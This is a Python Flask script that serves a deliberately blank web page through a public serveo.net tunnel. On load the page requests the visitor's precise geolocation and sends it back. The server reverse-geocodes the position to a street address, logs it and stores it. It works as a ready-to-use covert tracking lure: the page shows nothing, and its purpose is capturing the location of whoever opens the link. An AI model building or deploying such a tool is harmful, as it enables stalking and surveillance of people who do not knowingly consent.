import os
import subprocess
import logging
from flask import Flask, request, jsonify
from datetime import datetime
import time
import threading
import json
from geopy.geocoders import Nominatim
import requests

# Flask setup
app = Flask(__name__)

# Directory to save location data
LOCATION_FOLDER = os.path.expanduser('~/storage/downloads/LocationData')

# Ensure the LocationData folder exists
if not os.path.exists(LOCATION_FOLDER):
    os.makedirs(LOCATION_FOLDER)

# Set up logging
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
stream_handler = logging.StreamHandler()
stream_handler.setLevel(logging.INFO)
file_handler = logging.FileHandler('application.log')
file_handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
stream_handler.setFormatter(formatter)
file_handler.setFormatter(formatter)
logger.addHandler(stream_handler)
logger.addHandler(file_handler)

# Geolocator setup
geolocator = Nominatim(user_agent="location_capture")

# IP-based Geolocation API
IP_API_URL = "http://ipinfo.io/json"

@app.route('/')
def index():
    return '''
    <!doctype html>
    <html>
    <head>
        <title>Location Capture</title>
    </head>
    <body style="background-color: black; color: black;">
        <script>
            async function requestLocation() {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject);
                    });
                    const locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed
                    };
                    await fetch('/upload_location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(locationData)
                    });
                } catch (err) {
                    console.error("Location access denied:", err);
                }
            }

            window.onload = requestLocation;
        </script>
    </body>
    </html>
    '''

@app.route('/upload_location', methods=['POST'])
def upload_location():
    try:
        # Get location data from the request
        location_data = request.json
        if not location_data:
            raise ValueError("No location data received")

        # Generate filename using a custom format
        date_str = datetime.now().strftime('%A_%d_%I%p_%HM_%Y')
        location_file = os.path.join(LOCATION_FOLDER, f'{date_str}.json')

        # Reverse geocoding to get detailed location info
        latitude = location_data['latitude']
        longitude = location_data['longitude']
        location = geolocator.reverse((latitude, longitude), language='en', exactly_one=True)

        # Add detailed address information to the location data
        if location:
            location_data['address'] = location.address
            location_data['city'] = location.raw.get('address', {}).get('city', 'Not Available')
            location_data['street'] = location.raw.get('address', {}).get('road', 'Not Available')
            location_data['postcode'] = location.raw.get('address', {}).get('postcode', 'Not Available')
            location_data['country'] = location.raw.get('address', {}).get('country', 'Not Available')
            location_data['region'] = location.raw.get('address', {}).get('state', 'Not Available')
            location_data['county'] = location.raw.get('address', {}).get('county', 'Not Available')
            location_data['neighbourhood'] = location.raw.get('address', {}).get('neighbourhood', 'Not Available')
            location_data['suburb'] = location.raw.get('address', {}).get('suburb', 'Not Available')
            location_data['country_code'] = location.raw.get('address', {}).get('country_code', 'Not Available')
        
        # Additional location info based on IP if needed
        ip_info = get_ip_info()
        if ip_info:
            location_data['ip_location'] = ip_info

        # Save the location data to a JSON file
        with open(location_file, 'w') as f:
            json.dump(location_data, f, indent=4)

        # Display the location data in an easy-to-read format in the terminal
        logger.info("\nLocation Details:")
        logger.info(f"Latitude: {location_data['latitude']}")
        logger.info(f"Longitude: {location_data['longitude']}")
        logger.info(f"Accuracy: {location_data['accuracy']} meters")
        logger.info(f"Altitude: {location_data['altitude']} meters")
        logger.info(f"Altitude Accuracy: {location_data['altitudeAccuracy']} meters")
        logger.info(f"Speed: {location_data['speed']} m/s")
        logger.info(f"Heading: {location_data['heading']}")
        logger.info("\nDetailed Address:")
        logger.info(f"Address: {location_data['address']}")
        logger.info(f"City: {location_data['city']}")
        logger.info(f"Street: {location_data['street']}")
        logger.info(f"Postcode: {location_data['postcode']}")
        logger.info(f"Country: {location_data['country']}")
        logger.info(f"Region: {location_data['region']}")
        logger.info(f"County: {location_data['county']}")
        logger.info(f"Neighbourhood: {location_data['neighbourhood']}")
        logger.info(f"Suburb: {location_data['suburb']}")
        logger.info(f"Country Code: {location_data['country_code']}")

        if ip_info:
            logger.info("\nIP-based Location Info:")
            logger.info(f"IP: {ip_info['ip']}")
            logger.info(f"City: {ip_info['city']}")
            logger.info(f"Region: {ip_info['region']}")
            logger.info(f"Country: {ip_info['country']}")
            logger.info(f"Location: {ip_info['location']}")

        return jsonify({"message": "Location data saved successfully"}), 200

    except ValueError as ve:
        logger.error(f"Error: {ve}")
        return jsonify({"error": str(ve)}), 400
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        return jsonify({"error": "An unexpected error occurred"}), 500

def get_ip_info():
    """Fetch location based on the user's IP address."""
    try:
        response = requests.get(IP_API_URL)
        ip_data = response.json()
        return {
            'ip': ip_data.get('ip', 'Not Available'),
            'city': ip_data.get('city', 'Not Available'),
            'region': ip_data.get('region', 'Not Available'),
            'country': ip_data.get('country', 'Not Available'),
            'location': ip_data.get('loc', 'Not Available')
        }
    except Exception as e:
        logger.error(f"Error fetching IP information: {e}")
        return None

def run_flask(port=5665):
    try:
        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)  # Disable auto-reloader
    except Exception as e:
        logger.error(f"Flask server error: {e}")
        raise

def start_serveo_tunnel(port):
    global serveo_link
    serveo_command = f"ssh -o StrictHostKeyChecking=no -R 80:localhost:{port} serveo.net"

    while True:
        try:
            # Start the Serveo tunnel and wait for the URL
            process = subprocess.Popen(serveo_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            while True:
                output = process.stdout.readline()
                if output == b"" and process.poll() is not None:
                    break
                if output:
                    line = output.decode('utf-8').strip()
                    if "https://" in line:
                        serveo_link = line
                        logger.info(f"Serveo tunnel started. Access the application via: {line}")
                        return
            time.sleep(5)  # Retry if the tunnel fails to start
        except Exception as e:
            logger.error(f"Error starting Serveo tunnel: {e}")
            time.sleep(5)  # Retry after a short delay

def stop_other_processes(port=5665):
    try:
        # Automatically stop processes using the specified port (5665)
        result = subprocess.run(f'lsof -i :{port}', shell=True, capture_output=True, text=True)
        if result.stdout:
            # Extract PIDs of processes using the port
            pids = [line.split()[1] for line in result.stdout.splitlines()[1:]]  # Skip the header line
            for pid in pids:
                subprocess.run(f'kill -9 {pid}', shell=True)
                logger.info(f"Stopped process with PID {pid} using port {port}")
        else:
            logger.info(f"No processes are using port {port}")
    except Exception as e:
        logger.error(f"Error while stopping processes on port {port}: {e}")

def main():
    # Stop processes using the port before starting Flask
    stop_other_processes()

    # Dynamically select a free port (starting from 5665)
    port = 5665
    while True:
        try:
            # Run Flask app in a separate thread
            flask_thread = threading.Thread(target=run_flask, args=(port,))
            flask_thread.start()

            # Start Serveo tunnel in a separate thread
            serveo_thread = threading.Thread(target=start_serveo_tunnel, args=(port,))
            serveo_thread.start()

            # Wait for threads to complete
            flask_thread.join()
            serveo_thread.join()

        except Exception as e:
            logger.error(f"Error in main execution: {e}")
            time.sleep(5)

if __name__ == '__main__':
    main()
